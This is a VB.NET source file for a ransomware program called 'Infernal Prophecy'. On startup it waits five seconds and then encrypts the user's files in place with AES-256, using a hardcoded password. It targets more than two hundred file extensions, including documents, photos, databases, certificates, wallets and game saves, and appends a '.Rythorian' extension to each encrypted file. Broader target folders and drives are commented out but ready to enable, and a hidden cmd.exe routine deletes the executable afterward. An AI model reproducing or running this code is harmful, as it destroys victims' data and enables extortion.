'Infernal Prophecy: Created by: Justin Linwood Ross | (AKA) Rythorian Ethrovon | (AKA) David->>Lucian Patterson
'Copyright © 2022 - March - Black Star Research Facility
'Trademark: Dark Horse Productions
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Public Class Form1
    'Global Variables
    Private ReadOnly Endorium As String = "C:\Users\"

    Private ReadOnly TheAnaustrikCalendar As String = Environment.UserName

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'This is set to activate the encryption in 5 seconds from start up
        Timer1.Start()
        'Memory reduction for application to use less resources. Less odds of a crash
        Dim gateway As New Drocentium_Crystal()
    End Sub

    'AES: (RijndaelManaged) 256-Bit Encryption
    Public Function Riezengard_The_Malevolent_One(seedKill As Byte(), oraclepass As Byte()) As Byte()

        Dim FesteringBytes As Byte() = Nothing
        'A byte is not just 8 values between 0 and 1, but 256 (28) different stand for 3 values between 0 and 9, but 1000 (103) permutations from 0(00) to 999.
        Dim theBayofDead As Byte() = New Byte() {1, 1, 2, 2, 3, 3, 4, 4}

        Using rythorian As New MemoryStream()

            Using AES As New RijndaelManaged()
                'AES-256, which has a key length of 256 bits, supports the largest bit size and is practically unbreakable by brute force
                'based on current computing power, making it the strongest encryption standard. The following table shows that possible
                'key combinations exponentially increase with the key size.
                AES.KeySize = 256
                'AES uses a 128-bit block size, in which data is divided into a four-by-four array containing 16 bytes.
                'Since there are eight bits per byte, the total in each block is 128 bits. The size of the encrypted data
                'remains the same: 128 bits of plaintext yields 128 bits of ciphertext.
                AES.BlockSize = 128
                'Rfc2898DeriveBytes takes a password, a salt, and an iteration count, and then generates keys through calls to the GetBytes method.
                'RFC 2898 includes methods for creating a key and initialization vector (IV) from a password and salt.
                Dim key = New Rfc2898DeriveBytes(oraclepass,
                                                 theBayofDead,
                                                 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(rythorian, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(seedKill, 0, seedKill.Length)
                    cs.Close()
                End Using

                FesteringBytes = rythorian.ToArray()

            End Using

        End Using

        Return FesteringBytes
    End Function

    'Encryption Continuance
    Public Sub Thantalos_The_Filth(seething As String,
                                   malice As String)
        Dim maliceBitter As Byte() = Encoding.UTF8.GetBytes(malice)
        maliceBitter = SHA256.Create().ComputeHash(maliceBitter)
        Dim DarkendCrypt As Byte() = File.ReadAllBytes(seething)

        Try
            Dim VanquishLight As Byte() = Riezengard_The_Malevolent_One(DarkendCrypt,
                                                                        maliceBitter)
            File.WriteAllBytes(seething,
                               VanquishLight)
            'Names the new encrypted file extension
            Dim extension As String = ".Rythorian"
            File.Move(seething, seething _
                & extension)
        Catch __unusedUnauthorizedAccessException1__ As UnauthorizedAccessException
        End Try
    End Sub

    'Extension Hunter
    Public Sub Annika_Kreznoks_Infernal_Directory__The_Quiet_One(WormHole As String,
                                                                 malice As String)
        Try
            Dim quantumEntanglement = {".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png", ".csv",
                ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".sql", ".mp4", ".7z", ".rar", ".m4a",
                ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax",
                ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl",
                ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf",
                ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
                ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc",
                ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi",
                ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak",
                ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12",
                ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw",
                ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
                ".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb",
                ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm",
                ".odp", ".ods", ".odt", ".cs", ".exe", ".lnk", ".mpeg", ".mp3", ".mkv", ".divx", ".ogg", ".zip", ".wav", ".bat", ".index", ".jpeg",
                ".pdf", ".gif", ".css", ".js"}
            Dim files As String() = Directory.GetFiles(WormHole)
            Dim offspring As String() = Directory.GetDirectories(WormHole)

            For i As Integer = 0 To files.Length _
                    - 1
                Dim extension As String = Path.GetExtension(files(i))

                If quantumEntanglement.Contains(extension) Then
                    Thantalos_The_Filth(files(i),
                                        malice)
                End If
            Next

            ' For i As Integer = 0 To offspring.Length - 1
            'If offspring(i).Contains("Windows") OrElse offspring(i).Contains("Program Files") OrElse offspring(i).Contains("Program Files (x86)") Then Continue For
            'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(offspring(i), malice)

            'Next

        Catch __unusedSystemException1__ As SystemException
        End Try
    End Sub

    Private Sub Dead_Meadow()

        Dim malice As String = "1234567890!@#$%^&*()_+OrDeRoFCoRrUpTiOn" '"OBfP13b42VIyboCzWaFotxM3ekB4rByP"
        ' Dim aeros As String = "\Desktop\"
        'Dim apathy As String = "\Downloads\"
        'Dim murder As String = "\Documents\"
        'Dim psychotron As String = "\Pictures\"
        Dim mystra As String = "\Music\"
        'Dim cratus As String = "\Videos\"
        'Dim needle As String = Endorium & TheAnaustrikCalendar & aeros
        'Dim basket As String = Endorium & TheAnaustrikCalendar & apathy
        'Dim mirrors As String = Endorium & TheAnaustrikCalendar & murder
        'Dim shattered As String = Endorium & TheAnaustrikCalendar & psychotron
        Dim guide As String = Endorium & TheAnaustrikCalendar & mystra
        'Dim you As String = Endorium & TheAnaustrikCalendar & cratus

        Dim wrath As String() = Directory.GetLogicalDrives()

        For Each str As String In wrath

            If str = "C:\" Then
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(needle, malice)
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(basket, malice)
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(mirrors, malice)
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(shattered, malice)
                Annika_Kreznoks_Infernal_Directory__The_Quiet_One(guide, malice)
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(you, malice)

            Else
                'Annika_Kreznoks_Infernal_Directory__The_Quiet_One(str, malice)
            End If
        Next

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'Encryption Initiation
        Timer1.Stop()
        Dead_Meadow()
        'Self destruct sequence
        'Timer2.Start()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        ' Timer2.Stop()
        'Ultimate_Self_Destruction()
    End Sub

    'This can be placed in a timer that sets this program to self destruct.
    Public Sub Ultimate_Self_Destruction()

        Dim Info As New ProcessStartInfo With {
            .Arguments = $"/C timeout 2 && Del /Q /F {Application.ExecutablePath}",
            .WindowStyle = ProcessWindowStyle.Hidden,
            .CreateNoWindow = True,
            .FileName = "cmd.exe"
        }
        Process.Start(Info)

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        'Garbage Collection
        GC.Collect()
        GC.WaitForPendingFinalizers()
    End Sub
End Class
